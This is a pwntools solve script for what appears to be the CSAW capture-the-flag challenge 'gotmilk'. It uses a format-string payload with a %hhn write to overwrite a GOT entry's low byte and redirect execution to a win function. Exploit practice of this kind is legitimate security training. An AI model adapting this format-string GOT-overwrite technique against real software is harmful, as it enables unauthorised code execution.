from pwn import *

context.arch = 'i386'
context.log_level = 'info'

def exploit(p):
    p.recvuntil(b'GOT milk? ')
    # lose@got low byte 0xf8 -> 0x89 (win = base+0x1189, lose = base+0x11f8)
    payload  = p32(0x0804a010)
    payload += b'%133c%7$hhn'
    p.sendline(payload)
    data = p.recvall(timeout=5)
    return data

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == 'local':
        p = process('./gotmilk', env={'LD_LIBRARY_PATH': '.'})
    else:
        p = remote('pwn.chal.csaw.io', 1004)
    print(exploit(p))
